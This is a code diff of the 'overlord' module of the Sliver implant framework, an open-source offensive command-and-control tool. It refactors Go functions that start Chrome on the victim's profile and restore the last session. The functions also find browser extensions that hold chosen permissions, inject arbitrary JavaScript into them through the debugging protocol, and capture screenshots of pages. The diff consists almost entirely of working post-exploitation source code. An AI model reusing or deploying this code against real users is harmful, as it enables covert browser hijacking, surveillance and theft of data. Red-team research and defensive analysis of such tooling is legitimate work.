@@ -2,7 +2,7 @@ package overlord
 
 /*
 	Sliver Implant Framework
-	Copyright (C) 2020  Bishop Fox
+	Copyright (C) 2022  Bishop Fox
 	This program is free software: you can redistribute it and/or modify
 	it under the terms of the GNU General Public License as published by
 	the Free Software Foundation, either version 3 of the License, or
@@ -24,7 +24,6 @@ import (
 	"log"
 	"net/http"
 	"net/url"
-	"runtime"
 
 	"github.com/chromedp/cdproto/page"
 	"github.com/chromedp/cdproto/target"
@@ -91,39 +90,40 @@ const (
 
 var allocCtx context.Context
 
-func getContextOptions(userHomeDir string) []func(*chromedp.ExecAllocator) {
+func getContextOptions(userHomeDir string, platform string) []func(*chromedp.ExecAllocator) {
 	opts := []func(*chromedp.ExecAllocator){
 		chromedp.Flag("restore-last-session", true),
 		chromedp.UserDataDir(userHomeDir),
 	}
-	if runtime.GOOS == "darwin" {
+	switch platform {
+	case "darwin":
 		opts = append(opts,
 			chromedp.Flag("headless", false),
 			chromedp.Flag("use-mock-keychain", false),
 		)
-	} else {
+	default:
 		opts = append(opts, chromedp.Headless)
 	}
 	opts = append(chromedp.DefaultExecAllocatorOptions[:], opts...)
 	return opts
 }
 
-func getChromeContext(userHomeDir string, webSocketURL string) (context.Context, context.CancelFunc, context.CancelFunc) {
+func GetChromeContext(userHomeDir string, webSocketURL string, platform string) (context.Context, context.CancelFunc, context.CancelFunc) {
 	var (
 		cancel context.CancelFunc
 	)
 	if webSocketURL != "" {
 		allocCtx, cancel = chromedp.NewRemoteAllocator(context.Background(), webSocketURL)
 	} else {
-		opts := getContextOptions(userHomeDir)
+		opts := getContextOptions(userHomeDir, platform)
 		allocCtx, cancel = chromedp.NewExecAllocator(context.Background(), opts...)
 	}
 	taskCtx, taskCancel := chromedp.NewContext(allocCtx, chromedp.WithLogf(log.Printf))
 	return taskCtx, taskCancel, cancel
 }
 
-func findTargetInfoByID(taskCtx context.Context, targetID string) *target.Info {
-	targets, err := chromedp.Targets(taskCtx)
+func findTargetInfoByID(ctx context.Context, targetID string) *target.Info {
+	targets, err := chromedp.Targets(ctx)
 	if err != nil {
 		return nil
 	}
@@ -156,66 +156,25 @@ func containsAll(haystack []string, needles []string) bool {
 }
 
 // ExecuteJS - injects a JavaScript code into a target
-func ExecuteJS(userHomeDir string, webSocketURL string, targetID string, jsCode string) ([]byte, error) {
-	taskCtx, _, _ := getChromeContext(userHomeDir, webSocketURL)
-	targetInfo := findTargetInfoByID(taskCtx, targetID)
+func ExecuteJS(ctx context.Context, string, targetID string, jsCode string) ([]byte, error) {
+	targetInfo := findTargetInfoByID(ctx, targetID)
 	if targetInfo == nil {
 		return []byte{}, ErrTargetNotFound
 	}
-	extensionContext, _ := chromedp.NewContext(taskCtx, chromedp.WithTargetID(targetInfo.TargetID))
+	extensionContext, _ := chromedp.NewContext(ctx, chromedp.WithTargetID(targetInfo.TargetID))
 	var result []byte
 	err := chromedp.Run(extensionContext, chromedp.Evaluate(jsCode, &result))
 	return result, err
 }
 
-// Screenshot - Take a screenshot of a Chrome context
-func Screenshot(userHomeDir string, webSocketURL string, targetID string, quality int64) ([]byte, error) {
-
-	var result []byte
-	screenshotTask := chromedp.Tasks{
-		chromedp.ActionFunc(func(ctx context.Context) error {
-			_, _, _, _, _, contentSize, err := page.GetLayoutMetrics().Do(ctx)
-			if err != nil {
-				return err
-			}
-			result, err = page.CaptureScreenshot().
-				WithQuality(quality).
-				WithClip(&page.Viewport{
-					X:      contentSize.X,
-					Y:      contentSize.Y,
-					Width:  contentSize.Width,
-					Height: contentSize.Height,
-					Scale:  1,
-				}).Do(ctx)
-			if err != nil {
-				return err
-			}
-			return nil
-		}),
-	}
-
-	taskCtx, taskCancel, cancel := getChromeContext(userHomeDir, webSocketURL)
-	defer taskCancel()
-	defer cancel()
-	targetInfo := findTargetInfoByID(taskCtx, targetID)
-	if targetInfo == nil {
-		return []byte{}, ErrTargetNotFound
-	}
-	ctx, _ := chromedp.NewContext(taskCtx, chromedp.WithTargetID(targetInfo.TargetID))
-	if err := chromedp.Run(ctx, screenshotTask); err != nil {
-		return nil, err
-	}
-	return result, nil
-}
-
 // FindExtensionWithPermissions - Find an extension with a permission
-func FindExtensionWithPermissions(userHomeDir string, debugURL string, permissions []string) (*ChromeDebugTarget, error) {
+func FindExtensionWithPermissions(ctx context.Context, debugURL string, permissions []string) (*ChromeDebugTarget, error) {
 	targets, err := QueryExtensionDebugTargets(debugURL)
 	if err != nil {
 		return nil, err
 	}
 	for _, target := range targets {
-		result, err := ExecuteJS(userHomeDir, target.WebSocketDebuggerURL, target.ID, FetchManifestJS)
+		result, err := ExecuteJS(ctx, target.WebSocketDebuggerURL, target.ID, FetchManifestJS)
 		if err != nil {
 			continue
 		}
@@ -232,14 +191,14 @@ func FindExtensionWithPermissions(userHomeDir string, debugURL string, permissio
 }
 
 // FindExtensionsWithPermissions - Find an extension with a permission
-func FindExtensionsWithPermissions(userHomeDir string, debugURL string, permissions []string) ([]*ChromeDebugTarget, error) {
+func FindExtensionsWithPermissions(ctx context.Context, debugURL string, permissions []string) ([]*ChromeDebugTarget, error) {
 	targets, err := QueryExtensionDebugTargets(debugURL)
 	if err != nil {
 		return nil, err
 	}
 	extensions := []*ChromeDebugTarget{}
 	for _, target := range targets {
-		result, err := ExecuteJS(userHomeDir, target.WebSocketDebuggerURL, target.ID, FetchManifestJS)
+		result, err := ExecuteJS(ctx, target.WebSocketDebuggerURL, target.ID, FetchManifestJS)
 		if err != nil {
 			continue
 		}
@@ -302,4 +261,43 @@ func QueryExtensionDebugTargets(debugURL string) ([]ChromeDebugTarget, error) {
 		}
 	}
 	return extensionContexts, nil
+}
+
+// Screenshot - Take a screenshot of a Chrome context
+func Screenshot(userHomeDir string, platform string, webSocketURL string, targetID string, quality int64) ([]byte, error) {
+	var result []byte
+	screenshotTask := chromedp.Tasks{
+		chromedp.ActionFunc(func(ctx context.Context) error {
+			_, _, _, _, _, contentSize, err := page.GetLayoutMetrics().Do(ctx)
+			if err != nil {
+				return err
+			}
+			result, err = page.CaptureScreenshot().
+				WithQuality(quality).
+				WithClip(&page.Viewport{
+					X:      contentSize.X,
+					Y:      contentSize.Y,
+					Width:  contentSize.Width,
+					Height: contentSize.Height,
+					Scale:  1,
+				}).Do(ctx)
+			if err != nil {
+				return err
+			}
+			return nil
+		}),
+	}
+
+	taskCtx, taskCancel, cancel := GetChromeContext(userHomeDir, webSocketURL, platform)
+	defer taskCancel()
+	defer cancel()
+	targetInfo := findTargetInfoByID(taskCtx, targetID)
+	if targetInfo == nil {
+		return []byte{}, ErrTargetNotFound
+	}
+	ctx, _ := chromedp.NewContext(taskCtx, chromedp.WithTargetID(targetInfo.TargetID))
+	if err := chromedp.Run(ctx, screenshotTask); err != nil {
+		return nil, err
+	}
+	return result, nil
 }
